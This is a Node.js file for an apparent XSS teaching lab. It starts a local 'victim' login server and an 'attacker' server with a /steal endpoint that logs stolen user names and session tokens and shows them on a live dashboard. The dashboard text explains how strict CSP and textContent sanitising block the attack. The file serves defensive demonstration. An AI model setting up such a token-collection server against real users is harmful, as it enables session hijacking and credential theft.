const http = require("http");
const { URL } = require("url");
const fs = require("fs");
const path = require("path");

const ATTACKER_PORT = 9000;
const VICTIM_PORT   = 8080;
const STATIC_DIR    = __dirname;

// ─── State ───────────────────────────────────────────────────────────────────
let lastCapture = null;
const sseClients = [];   // live SSE connections to /view

function broadcast(eventData) {
  const msg = `data: ${JSON.stringify(eventData)}\n\n`;
  sseClients.forEach(client => client.write(msg));
}

// ─── Attacker Server (port 9000) ─────────────────────────────────────────────
const attackerServer = http.createServer((req, res) => {
  const fullUrl = new URL(req.url, `http://localhost:${ATTACKER_PORT}`);
  const urlPath = fullUrl.pathname;

  res.setHeader("Access-Control-Allow-Origin", "*");

  // ── /steal  — receive exfiltrated token ──────────────────────────────────
  if (urlPath === "/steal") {
    const user  = fullUrl.searchParams.get("user")  || "(missing)";
    const token = fullUrl.searchParams.get("token") || "(missing)";

    lastCapture = { time: new Date().toLocaleString(), user, token };

    console.log("\n=== TOKEN CAPTURED ===");
    console.log("Time :", lastCapture.time);
    console.log("User :", user);
    console.log("Token:", token.substring(0, 60) + "...");
    console.log("======================\n");

    // Push to all live /view tabs immediately
    broadcast({ type: "capture", ...lastCapture });

    res.writeHead(200, { "Content-Type": "image/gif" });
    res.end(Buffer.from("R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==", "base64"));
    return;
  }

  // ── /events  — SSE stream for live /view page ─────────────────────────────
  if (urlPath === "/events") {
    res.writeHead(200, {
      "Content-Type":  "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection":    "keep-alive",
    });
    res.write("data: {\"type\":\"connected\"}\n\n");

    sseClients.push(res);
    req.on("close", () => {
      const i = sseClients.indexOf(res);
      if (i !== -1) sseClients.splice(i, 1);
    });
    return;   // keep connection open
  }

  // ── /view  — live dashboard ───────────────────────────────────────────────
  if (urlPath === "/view") {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8"/>
  <title>Attacker — Live View</title>
  <style>
    body { background:#0a0a0f; color:#e8e8f0; font-family:Arial,sans-serif; padding:30px; margin:0; }
    h2   { color:#ff4d6d; margin-bottom:6px; }
    .subtitle { color:#6b6b80; font-size:13px; margin-bottom:28px; }
    #status {
      display:inline-flex; align-items:center; gap:8px;
      padding:8px 16px; border-radius:20px; font-size:13px; margin-bottom:24px;
      border:1px solid #1e1e2e;
    }
    #status.waiting  { background:rgba(107,107,128,.12); color:#6b6b80; border-color:#2a2a3e; }
    #status.live     { background:rgba(0,245,196,.08);   color:#00f5c4; border-color:rgba(0,245,196,.3); }
    #status.blocked  { background:rgba(255,77,109,.08);  color:#ff8fa3; border-color:rgba(255,77,109,.3); }
    .dot { width:8px; height:8px; border-radius:50%; }
    .dot.green  { background:#00f5c4; box-shadow:0 0 6px #00f5c4; animation:blink 1.2s infinite; }
    .dot.grey   { background:#6b6b80; }
    .dot.red    { background:#ff4d6d; box-shadow:0 0 6px #ff4d6d; }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }

    #capture-box {
      background:#111118; border:1px solid #1e1e2e; border-radius:12px;
      padding:24px; min-height:120px;
    }
    #capture-box.has-capture { border-color:rgba(0,245,196,.3); }
    #capture-box.blocked-hint { border-color:rgba(255,77,109,.3); }

    .field-label { font-size:11px; color:#6b6b80; text-transform:uppercase;
                   letter-spacing:1.5px; margin-bottom:4px; }
    .field-value { font-size:14px; color:#e8e8f0; margin-bottom:16px; }
    pre { background:#0d1117; color:#00f5c4; padding:14px; border-radius:8px;
          font-size:12px; white-space:pre-wrap; word-break:break-all; margin:0; }

    .blocked-msg {
      display:none; align-items:flex-start; gap:12px;
      background:rgba(255,77,109,.07); border:1px solid rgba(255,77,109,.25);
      border-radius:10px; padding:16px 20px;
    }
    .blocked-msg.show { display:flex; }
    .blocked-icon { font-size:24px; line-height:1; }
    .blocked-title { color:#ff8fa3; font-weight:bold; margin-bottom:4px; }
    .blocked-body  { color:#6b6b80; font-size:13px; line-height:1.6; }

    #idle-timer { font-size:12px; color:#6b6b80; margin-top:10px; }
    a { color:#00f5c4; }
  </style>
</head>
<body>
  <h2>⚡ Attacker — Live Capture View</h2>
  <p class="subtitle">Port 9000 · Updates in real-time via SSE · <a href="/">Home</a></p>

  <div id="status" class="waiting">
    <span class="dot grey" id="dot"></span>
    <span id="status-text">Connecting...</span>
  </div>

  <div id="capture-box">
    <div id="no-capture">
      <div class="field-label">Waiting for token...</div>
      <div id="idle-timer"></div>
    </div>
    <div id="capture-data" style="display:none">
      <div class="field-label">Time</div>
      <div class="field-value" id="cap-time">—</div>
      <div class="field-label">User</div>
      <div class="field-value" id="cap-user">—</div>
      <div class="field-label">Token</div>
      <pre id="cap-token">—</pre>
    </div>
  </div>

  <div class="blocked-msg" id="blocked-msg" style="margin-top:20px">
    <div class="blocked-icon">⛔</div>
    <div>
      <div class="blocked-title">No token received — attack likely blocked</div>
      <div class="blocked-body">
        The victim page is probably using <b style="color:#ff8fa3">V3 (Strict CSP)</b> or
        <b style="color:#ff8fa3">V4 (Secure Code)</b>.<br>
        In V3, CSP blocks inline event handlers so <code>stealToken()</code> never executes.<br>
        In V4, input is sanitised with <code>textContent</code> so no XSS occurs at all.<br>
        No request ever reached this server.
      </div>
    </div>
  </div>

<script>
  let lastCaptureTime = null;
  let idleTimer = null;
  const BLOCKED_THRESHOLD = 15000; // show blocked hint after 15s of no activity

  const evtSrc = new EventSource('/events');

  evtSrc.onopen = () => {
    setStatus('live', 'green', 'Live — waiting for captures');
  };

  evtSrc.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'capture') showCapture(data);
  };

  evtSrc.onerror = () => {
    setStatus('waiting', 'grey', 'Disconnected — retrying...');
  };

  function showCapture(data) {
    lastCaptureTime = Date.now();
    clearTimeout(idleTimer);
    document.getElementById('blocked-msg').classList.remove('show');

    document.getElementById('no-capture').style.display = 'none';
    document.getElementById('capture-data').style.display = 'block';
    document.getElementById('cap-time').textContent  = data.time;
    document.getElementById('cap-user').textContent  = data.user;
    document.getElementById('cap-token').textContent = data.token;

    const box = document.getElementById('capture-box');
    box.classList.add('has-capture');
    box.classList.remove('blocked-hint');

    setStatus('live', 'green', '✅ Token captured — ' + data.time);
    scheduleBlockedCheck();
  }

  function scheduleBlockedCheck() {
    clearTimeout(idleTimer);
    idleTimer = setTimeout(() => {
      document.getElementById('blocked-msg').classList.add('show');
      document.getElementById('capture-box').classList.add('blocked-hint');
      setStatus('blocked', 'red', 'No new captures — attack may be blocked (V3/V4)');
    }, BLOCKED_THRESHOLD);
  }

  function setStatus(cls, dot, text) {
    const el = document.getElementById('status');
    el.className = 'status ' + cls;
    document.getElementById('dot').className = 'dot ' + dot;
    document.getElementById('status-text').textContent = text;
  }

  // Start idle clock
  let seconds = 0;
  setInterval(() => {
    seconds++;
    document.getElementById('idle-timer').textContent =
      lastCaptureTime ? '' : 'Waiting ' + seconds + 's...';
  }, 1000);

  scheduleBlockedCheck();
</script>
</body>
</html>`);
    return;
  }

  // ── home ─────────────────────────────────────────────────────────────────
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  res.end(`<h2>Attacker Server — port ${ATTACKER_PORT}</h2>
    <ul>
      <li><a href="/view">/view</a> — live capture dashboard</li>
      <li><code>/steal?user=...&amp;token=...</code></li>
    </ul>`);
});

// ─── Victim App Server (port 8080) ────────────────────────────────────────────
const MIME = { ".html": "text/html", ".css": "text/css", ".js": "application/javascript" };

const victimServer = http.createServer((req, res) => {
  const fullUrl = new URL(req.url, `http://localhost:${VICTIM_PORT}`);
  const urlPath = fullUrl.pathname;

  const safePath = path.normalize(path.join(STATIC_DIR, path.basename(path.normalize(urlPath))));
  const ext = path.extname(safePath);

  if (MIME[ext] && fs.existsSync(safePath)) {
    res.writeHead(200, { "Content-Type": MIME[ext] + "; charset=utf-8" });
    fs.createReadStream(safePath).pipe(res);
    return;
  }

  res.writeHead(302, { Location: "/login.html" });
  res.end();
});

// ─── Startup ─────────────────────────────────────────────────────────────────
attackerServer.listen(ATTACKER_PORT, () => {
  console.log(`[ATTACKER] http://localhost:${ATTACKER_PORT}/view  ← live capture dashboard`);
});

victimServer.listen(VICTIM_PORT, () => {
  console.log(`[VICTIM]   http://localhost:${VICTIM_PORT}/login.html`);
});
